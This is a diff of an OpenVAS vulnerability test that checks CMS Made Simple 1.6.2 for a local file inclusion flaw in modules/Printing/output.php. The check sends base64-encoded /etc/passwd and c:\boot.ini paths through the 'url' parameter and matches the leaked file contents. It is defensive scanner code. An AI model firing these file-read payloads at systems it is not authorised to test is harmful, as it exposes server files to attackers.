@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_cms_made_simple_lfi_vuln.nasl 8447 2018-01-17 16:12:19Z teissa $
+# $Id: secpod_cms_made_simple_lfi_vuln.nasl 8680 2018-02-06 09:46:38Z ckuersteiner $
 #
 # CMS Made Simple 'modules/Printing/output.php' Local File Include Vulnerability
 #
@@ -24,30 +24,23 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation will allow attacker to obtain potentially
-  sensitive information and to execute arbitrary local scripts in the
-  context of the webserver process.
-  Impact Level: Application/System";
-tag_affected = "CMS Made Simple version 1.6.2";
-tag_insight = "The flaw is caused by improper validation of user-supplied input via the
-  'url' parameter to 'modules/Printing/output.php' that allows remote attackers
-  to view files and execute local scripts in the context of the webserver.";
-tag_solution = "Upgrade CMS Made Simple Version 1.6.3 or later,
-  For updates refer to http://www.cmsmadesimple.org/downloads/";
-tag_summary = "This host is running CMS Made Simple and is prone to local file
-  inclusion vulnerability.";
+CPE = "cpe:/a:cmsmadesimple:cms_made_simple";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.901141");
-  script_version("$Revision: 8447 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-01-17 17:12:19 +0100 (Wed, 17 Jan 2018) $");
+  script_version("$Revision: 8680 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-02-06 10:46:38 +0100 (Tue, 06 Feb 2018) $");
   script_tag(name:"creation_date", value:"2010-08-26 15:28:03 +0200 (Thu, 26 Aug 2010)");
   script_bugtraq_id(36005);
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
+
+  script_tag(name: "solution_type", value: "VendorFix");
+
   script_name("CMS Made Simple 'modules/Printing/output.php' Local File Include Vulnerability");
-  script_xref(name : "URL" , value : "http://www.cmsmadesimple.org/2009/08/05/announcing-cmsms-163-touho/");
+
+  script_xref(name: "URL", value: "http://www.cmsmadesimple.org/2009/08/05/announcing-cmsms-163-touho/");
 
   script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_ATTACK);
@@ -55,38 +48,46 @@ if(description)
   script_family("Web application abuses");
   script_dependencies("cms_made_simple_detect.nasl");
   script_require_ports("Services/www", 80);
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+  script_mandatory_keys("cmsmadesimple/installed");
+
+  script_tag(name: "impact", value: "Successful exploitation will allow attacker to obtain potentially sensitive
+information and to execute arbitrary local scripts in the context of the webserver process.");
+
+  script_tag(name: "affected", value: "CMS Made Simple version 1.6.2");
+
+  script_tag(name: "insight", value: "The flaw is caused by improper validation of user-supplied input via the
+'url' parameter to 'modules/Printing/output.php' that allows remote attackers to view files and execute local
+scripts in the context of the webserver.");
+
+  script_tag(name: "solution", value: "Upgrade CMS Made Simple Version 1.6.3 or later,
+  For updates refer to http://www.cmsmadesimple.org/downloads/");
+
+  script_tag(name: "summary", value: "This host is running CMS Made Simple and is prone to local file inclusion
+vulnerability.");
+
   exit(0);
 }
 
-
+include("host_details.inc");
 include("http_func.inc");
-include("version_func.inc");
 include("http_keepalive.inc");
 
-## Get HTTP Port
-port = get_http_port(default:80);
-if(!port){
+if (!port = get_app_port(cpe: CPE))
   exit(0);
-}
 
-## Get directory from KB
-dir = get_dir_from_kb(port:port, app:"cms_made_simple");
-if(! dir) {
+if (!dir = get_app_location(cpe: CPE, port: port))
   exit(0);
-}
 
-foreach file (make_list("L2V0Yy9wYXNzd2Q=","YzpcYm9vdC5pbmk="))
-{
-  ## Try attack and check the response to confirm vulnerability.
-  if(http_vuln_check(port:port, url:dir+"/modules/Printing/output.php?url="+file,
-                     pattern:"(root:.*:0:[01]:|\[boot loader\])"))
-  {
-        security_message(port:port);
-        exit(0);
+if (dir == "/")
+  dir = "";
+
+foreach file (make_list("L2V0Yy9wYXNzd2Q=","YzpcYm9vdC5pbmk=")) {
+  url = dir + "/modules/Printing/output.php?url=" + file;
+  if(http_vuln_check(port: port, url: url, pattern: "(root:.*:0:[01]:|\[boot loader\])")) {
+    report = report_vuln_url(port: port, url: url);
+    security_message(port: port, data: report);
+    exit(0);
   }
 }
+
+exit(99);
